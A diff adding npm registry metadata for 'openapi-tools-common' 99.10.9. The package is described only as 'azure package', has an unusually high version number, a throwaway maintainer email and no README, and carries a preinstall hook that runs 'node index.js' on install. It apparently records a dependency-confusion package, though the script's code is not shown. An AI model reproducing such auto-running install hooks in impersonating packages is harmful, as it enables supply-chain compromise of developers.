@@ -1,0 +1,62 @@
+{
+    "_id": "openapi-tools-common",
+    "name": "openapi-tools-common",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "openapi-tools-common",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "openapi-tools-common@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-PIq8KrP2lsj78X9ZlBAuh9gzZ3hD7MuWbMN5DO795KAqHk0WtYRJixaYpY/XipFVC2LvLTciRwq/5kiXLy+ppA==",
+                "shasum": "9df5b5b6cc20cb8e79571dd598c8a72ace80270b",
+                "tarball": "https://registry.npmjs.org/openapi-tools-common/-/openapi-tools-common-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5072,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO1ciACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmp1yw/+Mr3hCgWazXPP2Z1p4fmvSvA079Cb5Lse8K3bTdJn4FwhSwOp\r\nPYFG5HsgHpnUG/o459QOYlQw549wNB18thKRTN2mcds+3oEdODD3jdvSK2KJ\r\njq0+rygmjkaPA0JFNikptdFQMt78qCSGOzImGT5jg3Z3twu5VRWc/5cdXb3A\r\nbO8oU/TUxqdx+KHxV+B7+0LcbkhHdZJfyz5jSGpOqG6XBoJxABzM/IzVS+rE\r\nWQdszfstEHyLYZrBndM6/hJlZG+oBkWXFWItdQGJFMnT2LyD7RQj8uvfMZUX\r\nAgFL6BAHmiwhWG1o6i9GSbj1MfKJiFejgVBtRdGpbXi9AzUxwsdVc4U/9dZm\r\nCwx01NXcL39B8JbkrCMg7CwuupL/m2Dl/RHdjN4L4XokyErrpPFjXn8PDd1D\r\nsgpIE79RqLNTf22C7zjxgaHPh+2zVkiq5AQ2I5iVUh2H0LOMzBHUELfccyLc\r\nDmBNTQOY9/NLz7kYVfrez6eEw6/AukmdKwRHuNgizbOqd7P9Vafgm0IujA9S\r\nEIeQD7YLXodfzaTMX7WwuaLfqOxdTHBRCSPzkZL0riYK8UstN77cL9Sw9nsH\r\nWj2WH4OeYuamS+Q48Jpp4KILCblwUJScnFXqJo/lyJ2wv17IJ8Lnm2r/u2Oo\r\ntNTJsiYNWVhAgXyAg6j5suFKt89UGxFYZZQ=\r\n=57O1\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "uw17xypz",
+                "email": "uw17xypz@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "uw17xypz",
+                    "email": "uw17xypz@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/openapi-tools-common_99.10.9_1648056097718_0.5171351477591868"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T17:21:37.718Z",
+        "99.10.9": "2022-03-23T17:21:38.070Z",
+        "modified": "2022-03-23T17:21:38.205Z"
+    },
+    "maintainers": [
+        {
+            "name": "uw17xypz",
+            "email": "uw17xypz@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
